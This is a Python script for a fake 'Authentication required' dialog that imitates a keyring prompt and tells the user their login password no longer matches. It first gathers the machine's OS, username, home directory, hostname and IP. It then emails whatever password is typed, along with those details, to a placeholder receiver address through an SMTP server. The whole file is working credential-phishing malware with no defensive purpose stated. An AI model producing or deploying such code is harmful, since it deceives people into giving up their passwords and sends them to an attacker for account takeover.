import tkinter as tk
import platform, socket, smtplib
from pathlib import Path
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# -------------------------------------------------- #
# OS Info
# -------------------------------------------------- #
class OSRecon:
    def __init__(self):
        self.os = platform.system()
        self.arch = "{0} {1}".format(platform.machine(), platform.architecture())
        self.username = platform.os.getlogin()
        self.home = str(Path.home())
        self.node = platform.node()
        self.node_ip = socket.gethostbyname(socket.gethostname())
        try:
            self.dump = platform.freedesktop_os_release()
        except:
            pass

r = OSRecon()

# -------------------------------------------------- #
# Send Mail:
# -------------------------------------------------- #
def send_mail(password):
    # Create:
    mailbox = "RECEIVER@MAIL"
    sender = ""
    sender_pass = ""
    smtp_server = smtplib.SMTP('smtp.domain.com', 587)
    subject = "Data from {0}".format(r.username)
    body = """Username: {0}
Password: {1}
OS: {2} {3}
Home: {4}
Node: {5}:{6}""".format(r.username, password, r.os, r.arch, r.home, r.node, r.node_ip)
    print(body)
    # Connect:
    try:
        smtp_server.starttls()
        smtp_server.login(sender, sender_pass)
        # Send:
        mail = MIMEMultipart()
        mail['From'] = sender
        mail['Subject'] = subject
        mail.attach(MIMEText(body, 'plain'))
        mail['To'] = mailbox
        smtp_server.sendmail(sender, mailbox, mail.as_string())
    except Exception as error:
        print(error)
    quit()
# -------------------------------------------------- #
# Window:
# -------------------------------------------------- #
# Main:
window = tk.Tk()
window.title('Authentication required')
#window.geometry("600x150")
# Variables:
passwd = tk.StringVar()
# Submit button:
def button():
    send_mail(passwd.get())
    # Reset:
    passwd.set("")

# Text:
phrase_a = tk.Label(window,text="     The password you use to log in your computer     ")
phrase_a.grid(column=0, row=0)
phrase_b = tk.Label(window,text="no longer matches that of your login keyring.")
phrase_b.grid(column=0, row=1)
# First Space:
space_a = tk.Label(window, text="")
space_a.grid(column=0, row=2)
# Entry Field:
entry_field = tk.Entry(window, width=30, textvariable=passwd, show="*")
entry_field.grid(column=0, row=3)
# Second Space:
space_b = tk.Label(window, text="")
space_b.grid(column=0, row=4)
# Button:
submit = tk.Button(window, text="Unlock", command=button)
submit.grid(column=0, row=5)
# Start:
window.mainloop()
